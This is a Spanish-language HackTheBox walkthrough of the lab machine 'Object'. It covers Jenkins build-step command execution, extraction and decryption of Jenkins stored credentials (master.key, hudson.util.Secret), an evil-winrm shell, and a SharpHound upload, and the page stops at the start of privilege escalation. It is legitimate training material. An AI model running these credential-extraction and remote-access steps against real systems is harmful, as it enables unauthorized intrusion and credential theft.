<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><meta name="next-head-count" content="2"/><link rel="preload" href="/nextjs-github-pages/_next/static/css/bff8db8335876f50.css" as="style" crossorigin=""/><link rel="stylesheet" href="/nextjs-github-pages/_next/static/css/bff8db8335876f50.css" crossorigin="" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" crossorigin="" nomodule="" src="/nextjs-github-pages/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/nextjs-github-pages/_next/static/chunks/webpack-a4f5812bb7f5b7f2.js" defer="" crossorigin=""></script><script src="/nextjs-github-pages/_next/static/chunks/framework-5429a50ba5373c56.js" defer="" crossorigin=""></script><script src="/nextjs-github-pages/_next/static/chunks/main-f79afddfaed1e50b.js" defer="" crossorigin=""></script><script src="/nextjs-github-pages/_next/static/chunks/pages/_app-a4ac65f2b1f77632.js" defer="" crossorigin=""></script><script src="/nextjs-github-pages/_next/static/chunks/855-affb66a2508f9c52.js" defer="" crossorigin=""></script><script src="/nextjs-github-pages/_next/static/chunks/pages/posts/post/%5Bslug%5D-49000cd62d2003b4.js" defer="" crossorigin=""></script><script src="/nextjs-github-pages/_next/static/8FBaA9tE3H2FwnNG4HFAa/_buildManifest.js" defer="" crossorigin=""></script><script src="/nextjs-github-pages/_next/static/8FBaA9tE3H2FwnNG4HFAa/_ssgManifest.js" defer="" crossorigin=""></script></head><body class=" bg-gray-100"><div id="__next"><div class="flex flex-col h-screen"><div class="w-full  bg-black"><div class="max-w-screen-xl mx-auto"><header class="flex items-center justify-between py-5  "><a class="px-2 text-xl lg:px-0 font-bold text-orange-400" href="/nextjs-github-pages">Github Blog</a><ul class="inline-flex items-center"><li class="px-2 md:px-4"><a class="text-white font-semibold hover:text-orange-500" href="/nextjs-github-pages"> Home </a></li><li class="px-2 md:px-4"><a class="text-white font-semibold hover:text-orange-500" href="/nextjs-github-pages/dev"> Developerment </a></li><li class="px-2 md:px-4"><a class="text-white font-semibold hover:text-orange-500" href="/nextjs-github-pages/htb"> HackTheBox </a></li><li class="px-2 md:px-4"><a class="text-white font-semibold hover:text-orange-500" href="/nextjs-github-pages/pentesting-web"> Pentesting Web </a></li></ul></header></div></div><main class="flex-grow"><div class="container mx-auto px-4"><h1 class="text-6xl text-center py-20 font-bold">HackTheBox - Máquina Object</h1><h5 class="text-xl text-center">Paso a paso de la explotación de la maquina Object de HackTheBox.</h5><div><div><h6 class="text-center pt-3">Dificultad: <span class=" text-red-500">Hard</span></h6><h6 class="text-center ">OS <!-- -->Sistema Operativo Windows</h6></div></div><h6 class="text-center py-5">Publicado el <!-- -->9 de febrero de 2024</h6><h2 class="text-2xl py-10 text-center font-bold">Port Enumeration</h2>
<h3 class="text-lg my-5 font-bold">TCP</h3>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Enumeración de puertos TCP</p>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">sudo nmap -sS -p80,5985,8080 10.129.96.147 -A -Pn             
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 18:18 EDT
Nmap scan report for 10.129.96.147
Host is up (0.13s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
|_http-title: Mega Engines
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
8080/tcp open  http    Jetty 9.4.43.v20210629
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn&#x27;t have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.43.v20210629)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   126.52 ms 10.10.14.1
2   126.92 ms 10.129.96.147

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.22 seconds

</code></pre>
<h3 class="text-lg my-5 font-bold">UDP</h3>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Enumeración de UDP</p>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">sudo nmap -sU -F 10.129.96.147 -T5                
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-20 18:19 EDT
Nmap scan report for 10.129.96.147
Host is up (0.13s latency).
Not shown: 98 open|filtered udp ports (no-response)
PORT    STATE SERVICE
53/udp  open  domain
123/udp open  ntp

Nmap done: 1 IP address (1 host up) scanned in 4.44 seconds

</code></pre>
<h2 class="text-2xl py-10 text-center font-bold">Enumeracion de Servicios</h2>
<h3 class="text-lg my-5 font-bold">HTTP port 80:</h3>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">La enumeración con Gobuster dio como resultado que no existen otros directorios ni dominios adicionales</p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Banner Grabbing</p>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Tue, 26 Oct 2021 06:21:32 GMT
Accept-Ranges: bytes
ETag: &quot;61128db831cad71:0&quot;
Server: Microsoft-IIS/10.0
Date: Mon, 20 Jun 2022 21:11:13 GMT
Connection: close
Content-Length: 29932
</code></pre>
<p class="mdx-p text-justify mx-2.5 hyphens-auto"><img alt="" loading="lazy" width="400" height="200" decoding="async" data-nimg="1" style="color:transparent;width:auto;height:auto;margin-left:auto;margin-right:auto" src="/nextjs-github-pages/Object/Pasted_image_20220620182027.png"/></p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Ingresamos al link automation</p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Y nos redirige al dominio object.htb:8080. Por lo que agregamos el dominio /etc/hosts</p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Luego de agregar el dominio al archivo /etc/hosts ingresamos nuevamente a la aplicación web en puerto 8080</p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto"><img alt="" loading="lazy" width="400" height="200" decoding="async" data-nimg="1" style="color:transparent;width:auto;height:auto;margin-left:auto;margin-right:auto" src="/nextjs-github-pages/Object/Pasted_image_20220620182300.png"/></p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Contenido del archivo robots.txt</p>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400"># we don&#x27;t want robots to click &quot;build&quot; links
User-agent: *
Disallow: /
</code></pre>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Creamos un usuario y logramos ingresar al sistema</p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto"><img alt="" loading="lazy" width="400" height="200" decoding="async" data-nimg="1" style="color:transparent;width:auto;height:auto;margin-left:auto;margin-right:auto" src="/nextjs-github-pages/Object/Pasted_image_20220620182550.png"/></p>
<h2 class="text-2xl py-10 text-center font-bold">Vulnerabilities analysis</h2>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">La siguiente página nos indica que es posible ejecutar comandos en el sistema mediante la creación de builds</p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto"><a href="https://book.hacktricks.xyz/cloud-security/jenkins" class="mdx-p inline-block mb-4 text-xs font-bold capitalize border-b-2 border-orange-600 hover:text-orange-600">https://book.hacktricks.xyz/cloud-security/jenkins</a></p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Creamos un nuevo proyecto</p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Vamos a la sección de triggers</p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Y configuramos lo siguiente</p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto"><img alt="" loading="lazy" width="400" height="200" decoding="async" data-nimg="1" style="color:transparent;width:auto;height:auto;margin-left:auto;margin-right:auto" src="/nextjs-github-pages/Object/Pasted_image_20220621071436.png"/></p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Esto lo hacemos para que se ejecute el Build donde ingresaremos nuestro comando</p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">En Build presionamos sobre el botón Add build step y seleccionamos Execute Windows batch command. Luego, agregamos lo siguiente:</p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto"><img alt="" loading="lazy" width="400" height="200" decoding="async" data-nimg="1" style="color:transparent;width:auto;height:auto;margin-left:auto;margin-right:auto" src="/nextjs-github-pages/Object/Pasted_image_20220621071556.png"/></p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Esperamos unos minutos y vemos el resultado</p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto"><img alt="" loading="lazy" width="400" height="200" decoding="async" data-nimg="1" style="color:transparent;width:auto;height:auto;margin-left:auto;margin-right:auto" src="/nextjs-github-pages/Object/Pasted_image_20220621071328.png"/></p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">El software está ejecutandose como el usuario oliver</p>
<h1 class="text-4xl text-center my-10 font-bold">Explotation</h1>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Intentaremos verificar que el sistema no tiene habilitado algun firewall</p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto"><img alt="" loading="lazy" width="400" height="200" decoding="async" data-nimg="1" style="color:transparent;width:auto;height:auto;margin-left:auto;margin-right:auto" src="/nextjs-github-pages/Object/Pasted_image_20220621072459.png"/></p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Con python creamos un servidor http a la esucha y vemos si es posible la conexión</p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto"><img alt="" loading="lazy" width="400" height="200" decoding="async" data-nimg="1" style="color:transparent;width:auto;height:auto;margin-left:auto;margin-right:auto" src="/nextjs-github-pages/Object/Pasted_image_20220621072512.png"/></p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Comenzamos a enumera el sistema y extraer alguna información que nos sea util</p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Enumeramos los directorios</p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto"><img alt="" loading="lazy" width="400" height="200" decoding="async" data-nimg="1" style="color:transparent;width:auto;height:auto;margin-left:auto;margin-right:auto" src="/nextjs-github-pages/Object/Pasted_image_20220621073347.png"/></p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Luego consultamos el directorio C:\Users\oliver\AppData\Local\Jenkins.jenkins</p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto"><img alt="" loading="lazy" width="400" height="200" decoding="async" data-nimg="1" style="color:transparent;width:auto;height:auto;margin-left:auto;margin-right:auto" src="/nextjs-github-pages/Object/Pasted_image_20220621073716.png"/></p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Según el siguiente sitio: <a href="https://stackoverflow.com/questions/52930545/what-is-the-purpose-of-the-jenkins-user-folder-and-what-are-these-config-files" class="mdx-p inline-block mb-4 text-xs font-bold capitalize border-b-2 border-orange-600 hover:text-orange-600">https://stackoverflow.com/questions/52930545/what-is-the-purpose-of-the-jenkins-user-folder-and-what-are-these-config-files</a></p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">El archivo config.xml del directorio users contiene información de los usuarios del sistema. Por lo que intentaremos acceder al contenido del archivo.</p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">C:\Users\oliver\AppData\Local\Jenkins.jenkins\users\leftraro_9491939160013366012\config.xml</p>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">&lt;?xml version=&#x27;1.1&#x27; encoding=&#x27;UTF-8&#x27;?&gt;
&lt;user&gt;
  &lt;version&gt;10&lt;/version&gt;
  &lt;id&gt;leftraro&lt;/id&gt;
  &lt;fullName&gt;leftraro&lt;/fullName&gt;
  &lt;properties&gt;
    &lt;jenkins.security.ApiTokenProperty&gt;
      &lt;tokenStore&gt;
        &lt;tokenList/&gt;
      &lt;/tokenStore&gt;
    &lt;/jenkins.security.ApiTokenProperty&gt;
    &lt;com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin=&quot;credentials@2.6.1&quot;&gt;
      &lt;domainCredentialsMap class=&quot;hudson.util.CopyOnWriteMap$Hash&quot;/&gt;
    &lt;/com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty&gt;
    &lt;hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin=&quot;email-ext@2.84&quot;&gt;
      &lt;triggers/&gt;
    &lt;/hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty&gt;
    &lt;hudson.model.MyViewsProperty&gt;
      &lt;views&gt;
        &lt;hudson.model.AllView&gt;
          &lt;owner class=&quot;hudson.model.MyViewsProperty&quot; reference=&quot;../../..&quot;/&gt;
          &lt;name&gt;all&lt;/name&gt;
          &lt;filterExecutors&gt;false&lt;/filterExecutors&gt;
          &lt;filterQueue&gt;false&lt;/filterQueue&gt;
          &lt;properties class=&quot;hudson.model.View$PropertyList&quot;/&gt;
        &lt;/hudson.model.AllView&gt;
      &lt;/views&gt;
    &lt;/hudson.model.MyViewsProperty&gt;
    &lt;org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin=&quot;display-url-api@2.3.5&quot;&gt;
      &lt;providerId&gt;default&lt;/providerId&gt;
    &lt;/org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty&gt;
    &lt;hudson.model.PaneStatusProperties&gt;
      &lt;collapsed/&gt;
    &lt;/hudson.model.PaneStatusProperties&gt;
    &lt;jenkins.security.seed.UserSeedProperty&gt;
      &lt;seed&gt;0a9baf906da7ec2b&lt;/seed&gt;
    &lt;/jenkins.security.seed.UserSeedProperty&gt;
    &lt;hudson.search.UserSearchProperty&gt;
      &lt;insensitiveSearch&gt;true&lt;/insensitiveSearch&gt;
    &lt;/hudson.search.UserSearchProperty&gt;
    &lt;hudson.model.TimeZoneProperty/&gt;
    &lt;hudson.security.HudsonPrivateSecurityRealm_-Details&gt;
      &lt;passwordHash&gt;#jbcrypt:$2a$10$Y4W8YbX0jiPJDGgfKcnhauOpdZ84NoaZeI/HP76dSqxQTxzShlHqO&lt;/passwordHash&gt;
    &lt;/hudson.security.HudsonPrivateSecurityRealm_-Details&gt;
    &lt;hudson.tasks.Mailer_-UserProperty plugin=&quot;mailer@1.34&quot;&gt;
      &lt;emailAddress&gt;leftraro@asdas.cl&lt;/emailAddress&gt;
    &lt;/hudson.tasks.Mailer_-UserProperty&gt;
    &lt;jenkins.security.LastGrantedAuthoritiesProperty&gt;
      &lt;roles&gt;
        &lt;string&gt;authenticated&lt;/string&gt;
      &lt;/roles&gt;
      &lt;timestamp&gt;1655809043400&lt;/timestamp&gt;
    &lt;/jenkins.security.LastGrantedAuthoritiesProperty&gt;
  &lt;/properties&gt;
&lt;/user&gt;
</code></pre>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Luego consultamos el del usuario admin</p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">type C:\Users\oliver\AppData\Local\Jenkins.jenkins\users\</p>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">&lt;?xml version=&#x27;1.1&#x27; encoding=&#x27;UTF-8&#x27;?&gt;
&lt;user&gt;
  &lt;version&gt;10&lt;/version&gt;
  &lt;id&gt;admin&lt;/id&gt;
  &lt;fullName&gt;admin&lt;/fullName&gt;
  &lt;properties&gt;
    &lt;com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin=&quot;credentials@2.6.1&quot;&gt;
      &lt;domainCredentialsMap class=&quot;hudson.util.CopyOnWriteMap$Hash&quot;&gt;
        &lt;entry&gt;
          &lt;com.cloudbees.plugins.credentials.domains.Domain&gt;
            &lt;specifications/&gt;
          &lt;/com.cloudbees.plugins.credentials.domains.Domain&gt;
          &lt;java.util.concurrent.CopyOnWriteArrayList&gt;
            &lt;com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl&gt;
              &lt;id&gt;320a60b9-1e5c-4399-8afe-44466c9cde9e&lt;/id&gt;
              &lt;description&gt;&lt;/description&gt;
              &lt;username&gt;oliver&lt;/username&gt;
              &lt;password&gt;{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}&lt;/password&gt;
              &lt;usernameSecret&gt;false&lt;/usernameSecret&gt;
            &lt;/com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl&gt;
          &lt;/java.util.concurrent.CopyOnWriteArrayList&gt;
        &lt;/entry&gt;
      &lt;/domainCredentialsMap&gt;
    &lt;/com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty&gt;
    &lt;hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin=&quot;email-ext@2.84&quot;&gt;
      &lt;triggers/&gt;
    &lt;/hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty&gt;
    &lt;hudson.model.MyViewsProperty&gt;
      &lt;views&gt;
        &lt;hudson.model.AllView&gt;
          &lt;owner class=&quot;hudson.model.MyViewsProperty&quot; reference=&quot;../../..&quot;/&gt;
          &lt;name&gt;all&lt;/name&gt;
          &lt;filterExecutors&gt;false&lt;/filterExecutors&gt;
          &lt;filterQueue&gt;false&lt;/filterQueue&gt;
          &lt;properties class=&quot;hudson.model.View$PropertyList&quot;/&gt;
        &lt;/hudson.model.AllView&gt;
      &lt;/views&gt;
    &lt;/hudson.model.MyViewsProperty&gt;
    &lt;org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin=&quot;display-url-api@2.3.5&quot;&gt;
      &lt;providerId&gt;default&lt;/providerId&gt;
    &lt;/org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty&gt;
    &lt;hudson.model.PaneStatusProperties&gt;
      &lt;collapsed/&gt;
    &lt;/hudson.model.PaneStatusProperties&gt;
    &lt;jenkins.security.seed.UserSeedProperty&gt;
      &lt;seed&gt;ea75b5bd80e4763e&lt;/seed&gt;
    &lt;/jenkins.security.seed.UserSeedProperty&gt;
    &lt;hudson.search.UserSearchProperty&gt;
      &lt;insensitiveSearch&gt;true&lt;/insensitiveSearch&gt;
    &lt;/hudson.search.UserSearchProperty&gt;
    &lt;hudson.model.TimeZoneProperty/&gt;
    &lt;hudson.security.HudsonPrivateSecurityRealm_-Details&gt;
      &lt;passwordHash&gt;#jbcrypt:$2a$10$q17aCNxgciQt8S246U4ZauOccOY7wlkDih9b/0j4IVjZsdjUNAPoW&lt;/passwordHash&gt;
    &lt;/hudson.security.HudsonPrivateSecurityRealm_-Details&gt;
    &lt;hudson.tasks.Mailer_-UserProperty plugin=&quot;mailer@1.34&quot;&gt;
      &lt;emailAddress&gt;admin@object.local&lt;/emailAddress&gt;
    &lt;/hudson.tasks.Mailer_-UserProperty&gt;
    &lt;jenkins.security.ApiTokenProperty&gt;
      &lt;tokenStore&gt;
        &lt;tokenList/&gt;
      &lt;/tokenStore&gt;
    &lt;/jenkins.security.ApiTokenProperty&gt;
    &lt;jenkins.security.LastGrantedAuthoritiesProperty&gt;
      &lt;roles&gt;
        &lt;string&gt;authenticated&lt;/string&gt;
      &lt;/roles&gt;
      &lt;timestamp&gt;1634793332195&lt;/timestamp&gt;
    &lt;/jenkins.security.LastGrantedAuthoritiesProperty&gt;
  &lt;/properties&gt;
&lt;/user&gt;
</code></pre>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Para extraer las contraseñas podemos utilizar el siguiente script en python</p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Debemos descargar dos archivos</p>
<ul class=" ml-10 mdx-p text-justify mx-2.5 hyphens-auto list-disc">
<li class="text-justify mx-2.5 hyphens-auto">master.key</li>
<li class="text-justify mx-2.5 hyphens-auto">hudson.util.Secret</li>
</ul>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Como este ultimo es un binario, lo convertiremos a base64 y luego lo decodificaremos y guardaremos en nuestro sistema:</p>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">powershell -c [convert]::ToBase64String((cat C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.util.Secret -Encoding byte))
</code></pre>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">hudson.util.Secret</p>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=
</code></pre>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">master.key</p>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">ZjY3M2ZkYjBjNGZjYzMzOTA3MDQzNWJkYmUxYTAzOWQ4M2E1OTdiZjIxZWFmYmI3ZjliMzViNTBmY2UwMDZlNTY0Y2ZmNDU2NTUzZWQ3M2NiMWZhNTY4YjY4YjMxMGFkZGM1NzZmMTYzN2E3ZmU3MzQxNGE0YzZmZjEwYjRlMjNhZGM1MzhlOWIzNjlhMGM2ZGU4ZmMyOTlkZmEyYTM5MDRlYzczYTI0YWE0ODU1MGIyNzZiZTUxZjkxNjU2Nzk1OTViMmNhYzAzY2MyMDQ0ZjNjNzAyZDY3NzE2OWUyZjRkM2JkOTZkODMyMWEyZTE5ZTJiZjBjNzZmZTMxZGIxOQ==
</code></pre>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Descodificamos los archivo y ejecutamos el script:</p>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">python decrypt.py master.key hudson.util.Secret config.xml
c1cdfun_d2434
</code></pre>
<h2 class="text-2xl py-10 text-center font-bold">Getting a shell</h2>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Ahora con las credenciales del usuario oliver podemos usar el servicio WinRM</p>
<ul class=" ml-10 mdx-p text-justify mx-2.5 hyphens-auto list-disc">
<li class="text-justify mx-2.5 hyphens-auto">User: oliver</li>
<li class="text-justify mx-2.5 hyphens-auto">Password: c1cdfun_d2434</li>
</ul>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">evil-winrm -i 10.129.90.135 -u oliver -p c1cdfun_d2434

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\oliver\Documents&gt; whoami
object\oliver
*Evil-WinRM* PS C:\Users\oliver\Documents&gt; 

</code></pre>
<h2 class="text-2xl py-10 text-center font-bold">System Enumeration</h2>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Usuarios del sistema</p>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">*Evil-WinRM* PS C:\Users&gt; ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/10/2021   3:20 AM                Administrator
d-----       10/26/2021   7:59 AM                maria
d-----       10/26/2021   7:58 AM                oliver
d-r---        4/10/2020  10:49 AM                Public
d-----       10/21/2021   3:44 AM                smith

</code></pre>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Servicios que esten a la esucha en algun puerto</p>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">*Evil-WinRM* PS C:\Users&gt; netstat -ano | findstr LISTENING
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       900
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       900
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       5644
  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING       2796
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       484
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       1160
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1520
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING       648
  TCP    0.0.0.0:49684          0.0.0.0:0              LISTENING       628
  TCP    0.0.0.0:49695          0.0.0.0:0              LISTENING       2928
  TCP    0.0.0.0:62258          0.0.0.0:0              LISTENING       2872
  TCP    10.129.90.135:53       0.0.0.0:0              LISTENING       2928
  TCP    10.129.90.135:139      0.0.0.0:0              LISTENING       4
  TCP    127.0.0.1:53           0.0.0.0:0              LISTENING       2928
  TCP    [::]:80                [::]:0                 LISTENING       4
  TCP    [::]:88                [::]:0                 LISTENING       648
  TCP    [::]:135               [::]:0                 LISTENING       900
  TCP    [::]:389               [::]:0                 LISTENING       648
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:464               [::]:0                 LISTENING       648
  TCP    [::]:593               [::]:0                 LISTENING       900
  TCP    [::]:636               [::]:0                 LISTENING       648
  TCP    [::]:3268              [::]:0                 LISTENING       648
  TCP    [::]:3269              [::]:0                 LISTENING       648
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:8080              [::]:0                 LISTENING       5644
  TCP    [::]:9389              [::]:0                 LISTENING       2796
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49664             [::]:0                 LISTENING       484
  TCP    [::]:49665             [::]:0                 LISTENING       1160
  TCP    [::]:49666             [::]:0                 LISTENING       1520
  TCP    [::]:49667             [::]:0                 LISTENING       648
  TCP    [::]:49673             [::]:0                 LISTENING       648
  TCP    [::]:49674             [::]:0                 LISTENING       648
  TCP    [::]:49684             [::]:0                 LISTENING       628
  TCP    [::]:49695             [::]:0                 LISTENING       2928
  TCP    [::]:62258             [::]:0                 LISTENING       2872
  TCP    [::1]:53               [::]:0                 LISTENING       2928
  TCP    [dead:beef::84]:53     [::]:0                 LISTENING       2928
  TCP    [dead:beef::eddf:29ac:70d6:2b4b]:53  [::]:0                 LISTENING       2928
  TCP    [fe80::eddf:29ac:70d6:2b4b%12]:53  [::]:0                 LISTENING       2928

</code></pre>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Al parecer es una Servidor Active Directory</p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Subimos el archivo SharpHound.ps1 para buscar vectores de ataque:</p>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">PS C:\Users\oliver\Desktop&gt; upload /home/kali/HTB/machines/res/SharpHound.ps1
Info: Uploading /home/kali/HTB/machines/res/SharpHound.ps1 to C:\Users\oliver\Desktop\SharpHound.ps1

                                                             
Data: 1298980 bytes of 1298980 bytes copied

Info: Upload successful!

</code></pre>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Luego lo ejecutamos:</p>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All
</code></pre>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Revisamos loa archivos creados</p>
<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">ls


    Directory: C:\Users\oliver\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/21/2022   6:40 AM           9060 20220621064046_BloodHound.zip
-a----        6/21/2022   6:40 AM          10043 MWU2MmE0MDctMjBkZi00N2VjLTliOTMtYThjYTY4MjdhZDA2.bin
-a----        6/21/2022   6:35 AM         974235 SharpHound.ps1
-ar---        6/21/2022   4:56 AM             34 user.txt

</code></pre>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Descargamos el archivo .zip</p>
<h2 class="text-2xl py-10 text-center font-bold">Elevación de privilegios</h2>
<p class="mdx-p text-justify mx-2.5 hyphens-auto">Lo importamos en bloodhound y luego buscamos el path mas corto para llegar a admin</p>
<p class="mdx-p text-justify mx-2.5 hyphens-auto"><img alt="" loading="lazy" width="400" height="200" decoding="async" data-nimg="1" style="color:transparent;width:auto;height:auto;margin-left:auto;margin-right:auto" src="/nextjs-github-pages/Object/Pasted_image_20220621111052.png"/></p>
